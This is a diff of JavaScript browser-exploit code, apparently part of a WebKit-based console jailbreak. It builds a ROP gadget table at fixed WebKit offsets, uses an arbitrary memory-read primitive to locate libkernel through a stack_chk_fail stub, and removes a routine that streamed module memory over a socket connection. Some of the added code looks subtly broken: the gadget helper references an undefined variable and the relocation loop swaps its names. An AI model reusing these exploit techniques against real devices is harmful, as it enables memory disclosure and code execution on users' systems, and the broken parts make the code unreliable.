@@ -17,37 +17,6 @@ var findModuleBaseXHR = function(addr)
         addr_.sub32inplace(0x1000);
     }
 }
-var log = function(x) {
-    document.getElementById("console").innerText += x + "\n";
-}
-var print = function(string) { // like log but html
-    document.getElementById("console").innerHTML += string + "\n";
-}
-
-var dumpModuleXHR = function(moduleBase) {
-    var chunk = new ArrayBuffer(0x1000);
-    var chunk32 = new Uint32Array(chunk);
-    var chunk8 = new Uint8Array(chunk);
-    
-    connection.binaryType = "arraybuffer";
-    var helo = new Uint32Array(1);
-    helo[0] = 0x41414141;
-    
-    var moduleBase_ = moduleBase.add32(0);
-    connection.onmessage = function() {
-        try {
-            for (var i = 0; i < chunk32.length; i++)
-            {
-                var val = p.read4(moduleBase_);
-                chunk32[i] = val;
-                moduleBase_.add32inplace(4);
-            }
-            connection.send(chunk8);
-        } catch (e) {
-            print(e);
-        }
-    }
-}
 var deref_stub_jmp = function(addr) {
   var z = p.read4(addr) & 0xFFFF;
   var y = p.read4(addr.add32(2));
@@ -56,10 +25,9 @@ var deref_stub_jmp = function(addr) {
   
   return addr.add32(y + 6);
 }
-var gadget = function(o)
-    {
-        return webKitBase.add32(o);
-    }
+
+
+var gadget = function(o){return addr.add32(o);}
       /*
       kchain.push(window.gadgets["pop rax"]);
       kchain.push(savectx.add32(0x30));
@@ -71,7 +39,7 @@ var gadget = function(o)
       kchain.push(savectx.add32(0x50));
       kchain.push(window.gadgets["mov [rdi], rax"]);
       */        
-           gadgets = {  
+gadgets = {  
   "ret":                    gadget(0x0000003C),
   "jmp rax":                gadget(0x00000082),
   "ep":                     gadget(0x000000AD),
@@ -95,11 +63,12 @@ var gadget = function(o)
   "add rax, rcx":           gadget(0x00015172),
   "jop":                    gadget(0x000c37d0),
   "infloop":                gadget(0x012C4009),
-
+  
+  "stack_chk_fail":         gadget(0x000000c8),
   "memset":                 gadget(0x00000228),
   "setjmp":                 gadget(0x000014f8)
-};
-  
+};  
+
 ;var reenter_help = { length:
     { valueOf: function(){
         return 0;
@@ -133,12 +102,11 @@ try {
     var offsetToWebKit = function(off) {
       return window.moduleBaseWebKit.add32(off)
     }
-
-    // Set gadgets to proper addresses
-    for(var gadget in gadgets) {
-      gadgets[gadget] = offsetToWebKit(gadgets[gadget]);
-    }   
-
+  
+        // Set gadgets to proper addresses
+    for(var gadgets in gadget) {
+      gadget[gadgets] = offsetToWebKit(gadget[gadgets]);
+    }
     var libKernelBase = p.read8(deref_stub_jmp(gadgets.stack_chk_fail));
     window.libKernelBase = libKernelBase;
     libKernelBase.low &= 0xfffff000;
